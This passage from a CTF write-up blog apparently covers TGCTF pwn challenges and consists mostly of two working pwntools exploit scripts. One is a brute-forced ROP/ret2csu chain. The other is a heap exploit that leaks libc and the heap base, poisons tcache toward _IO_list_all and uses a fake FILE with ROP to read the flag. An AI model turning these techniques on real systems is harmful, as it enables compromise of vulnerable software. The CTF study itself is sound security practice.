<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./TGCTF.so&#x27;</span>&#125;)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31772&#x27;</span></span><br><span class="line">    # p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"># add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br><span class="line">gadget1 = <span class="number">0x0000000000400548</span></span><br><span class="line">csu_back = <span class="number">0x40065A</span></span><br><span class="line">target = <span class="number">0x601010</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000004004e8</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004005fb</span></span><br><span class="line">csu_front = <span class="number">0x400640</span></span><br><span class="line">ret = <span class="number">0x0000000000400456</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>(offset):</span><br><span class="line">    pay = b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">fit</span>(csu_back, offset, target + <span class="number">0x3d</span>, target - <span class="number">8</span> * offset, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, gadget1,</span><br><span class="line">                           ret, csu_front)</span><br><span class="line"></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x4005FB&quot;</span>)</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line">    # <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    # offset = <span class="number">0x1e9b9</span> + <span class="number">0x6b</span></span><br><span class="line">    # offset = <span class="number">0xea24</span> # remote</span><br><span class="line">    # <span class="title function_">main</span>(offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                # p = <span class="title function_">process</span>(binary)</span><br><span class="line">                p = <span class="title function_">remote</span>(<span class="string">&quot;node1.tgctf.woooo.tech&quot;</span>, <span class="string">&#x27;31772&#x27;</span>)</span><br><span class="line">                offset = <span class="number">0x9b9</span> + <span class="number">0x6b</span></span><br><span class="line">                offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">                offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">                <span class="title function_">success</span>(<span class="string">&quot;try offset:\t&quot;</span> + <span class="title function_">hex</span>(offset))</span><br><span class="line">                <span class="title function_">main</span>(offset)</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">                p.<span class="title function_">sendline</span>(b<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">                flag = p.<span class="title function_">recvline_contains</span>(b<span class="string">&quot;&#123;&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">                <span class="title function_">print</span>(flag)</span><br><span class="line">                p.<span class="title function_">interactive</span>()</span><br><span class="line">            except <span class="title class_">EOFError</span>:</span><br><span class="line">                p.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>
<h3 id="qheap">qheap</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> <span class="title class_">SomeofHouse</span> <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line"># context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;32196&#x27;</span></span><br><span class="line">    # p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span>(idx):</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())    </span><br><span class="line"></span><br><span class="line">def <span class="title function_">add1</span>(idx, size, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Size: &#x27;</span>, <span class="title function_">str</span>(size).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;Data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">delete1</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span>(idx, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;Data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">add2</span>(idx, sz, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">356781</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(<span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(<span class="title function_">str</span>(sz).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(data)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">delete2</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">356781</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(<span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>(offset):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="title function_">add1</span>(<span class="number">0</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add2</span>(<span class="number">0</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line">    <span class="title function_">add2</span>(<span class="number">1</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line">    <span class="title function_">add2</span>(<span class="number">2</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">3</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    # fake size</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">0</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">p64</span>(<span class="number">0x51</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    #fake size</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">1</span>, <span class="number">0x40</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">p64</span>(<span class="number">0x31</span>))</span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    # leak ld</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    <span class="title function_">show</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    key = <span class="title function_">u64</span>(p.<span class="title function_">recvn</span>(<span class="number">8</span>))</span><br><span class="line">    libc.<span class="property">address</span> = (key &lt;&lt; <span class="number">12</span>) - off<span class="keyword">set</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="params"><span class="string">&#x27;libc&#x27;</span>, libc.address</span>)</span><br><span class="line"></span><br><span class="line">    # fix size</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">p64</span>(<span class="number">0x31</span>))</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">2</span>, <span class="number">0x20</span>, b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    # leak heapbase</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    <span class="title function_">show</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    heapbase = (<span class="title function_">u64</span>(p.<span class="title function_">recvn</span>(<span class="number">8</span>)) ^ key) - <span class="number">0x9e0</span></span><br><span class="line">    heap4_addr = heapbase + <span class="number">0x1960</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;heapbase&#x27;</span>, heapbase)</span><br><span class="line"></span><br><span class="line">    # hijack fd</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">fit</span>(<span class="number">0x31</span>, key ^ libc.<span class="property">sym</span>.<span class="property">_IO_list_all</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">2</span>, <span class="number">0x20</span>, b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">3</span>, <span class="number">0x20</span>, <span class="title function_">p64</span>(heap4_addr)) # _IO_list_all</span><br><span class="line"></span><br><span class="line">    hos = <span class="title class_">HouseOfSome</span>(libc, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>)</span><br><span class="line">    fake_io = hos.<span class="title function_">hoi_read_file_template</span>(</span><br><span class="line">        libc.<span class="property">sym</span>.<span class="property">__free_hook</span>, <span class="number">0x500</span>, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">4</span>, <span class="number">0x100</span>, fake_io)</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    stack = hos.<span class="title function_">bomb_raw</span>(p)</span><br><span class="line"></span><br><span class="line">    rop = <span class="title function_">ROP</span>(libc, stack)</span><br><span class="line">    rop.<span class="title function_">call</span>(<span class="string">&#x27;syscall&#x27;</span>, [<span class="number">2</span>, <span class="string">&#x27;./flag&#x27;</span>, <span class="number">0</span>])</span><br><span class="line">    rop.<span class="title function_">read</span>(<span class="number">3</span>, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>, <span class="number">0x40</span>)</span><br><span class="line">    rop.<span class="title function_">write</span>(<span class="number">1</span>, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">info</span>(rop.<span class="title function_">dump</span>())</span><br><span class="line">    pay = rop.<span class="title function_">chain</span>()</span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *_IO_do_write+177&quot;</span>)</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # <span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    # offset = <span class="number">0x292000</span> # local / remote <span class="number">0x282000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                # p = <span class="title function_">process</span>(binary)</span><br><span class="line">                p = <span class="title function_">remote</span>(<span class="string">&quot;node1.tgctf.woooo.tech&quot;</span>, <span class="string">&#x27;32254&#x27;</span>)</span><br><span class="line">                # p = <span class="title function_">remote</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">                offset = <span class="number">0x282000</span></span><br><span class="line">                offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">                offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">                <span class="title function_">success</span>(<span class="string">&quot;try offset:\t&quot;</span> + <span class="title function_">hex</span>(offset))</span><br><span class="line">                <span class="title function_">main</span>(offset)</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">                # p.<span class="title function_">sendline</span>(b<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">                flag = p.<span class="title function_">recvline_contains</span>(b<span class="string">&quot;&#123;&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">                <span class="title function_">print</span>(flag)</span><br><span class="line">                p.<span class="title function_">interactive</span>()</span><br><span class="line">            except <span class="title class_">EOFError</span>:</span><br><span class="line">                p.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/post/xuanji/"
                                   title="玄机应急响应靶场题解"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">玄机应急响应靶场题解</span>
                                        <span class="post-nav-item">下一篇</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;评论
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">评论插件加载失败</span>
    <button class="reload keep-button">点击重新加载</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">正在加载评论插件</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="waline-comment-container">
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.css"/>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline-meta.css"/>
        <div id="waline-comment"></div>
        <script data-pjax>
          window.KeepCommentPlugin.walineOptions = JSON.parse('{}'.replace(/&#34;/g, '"'))
          window.KeepCommentPlugin.walineOptions.el = '#waline-comment'
          window.KeepCommentPlugin.walineOptions.comment = '.post-comments-count'
          window.KeepCommentPlugin.walineOptions.serverURL = 'https://blog-waline-weld.vercel.app/'
          window.KeepCommentPlugin.walineOptions.lang = 'zh-CN' || 'zh-CN'
          window.KeepCommentPlugin.walineOptions.reaction = 'false' === 'true'
        </script>

        

        
            <script 
                    async
                    type="module"
            >
              import { init } from '//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.js'
              window.KeepCommentPlugin.initWaline = () => {
                if (init) {
                  init(window.KeepCommentPlugin.walineOptions)
                  window.KeepCommentPlugin.hideLoading()
                } else {
                  setTimeout(() => {
                    window.KeepCommentPlugin.initWaline()
                  }, 1000)
                }
              }

              if ('false' === 'true') {
                setTimeout(() => {
                  window.KeepCommentPlugin.initWaline()
                }, 1200)
              } else {
                window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initWaline)
              }
            </script>
        
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%EF%BC%9A"><span class="nav-text">Web：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3"><span class="nav-text">AAA偷渡阴平</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%81%AB%E7%9C%BC"><span class="nav-text">火眼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD"><span class="nav-text">直面天命</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GAME"><span class="nav-text">GAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GAME-plus"><span class="nav-text">GAME plus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GAME-Ultra"><span class="nav-text">GAME Ultra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezupload"><span class="nav-text">ezupload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9F"><span class="nav-text">什么文件上传？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%86%9F%E6%82%89%E7%9A%84%E9%85%8D%E6%96%B9%EF%BC%8C%E7%86%9F%E6%82%89%E7%9A%84%E5%91%B3%E9%81%93"><span class="nav-text">熟悉的配方，熟悉的味道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="nav-text">直面天命（复仇）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="nav-text">AAA偷渡阴平（复仇）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9F%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="nav-text">什么文件上传？（复仇）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc%EF%BC%9A"><span class="nav-text">Misc：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 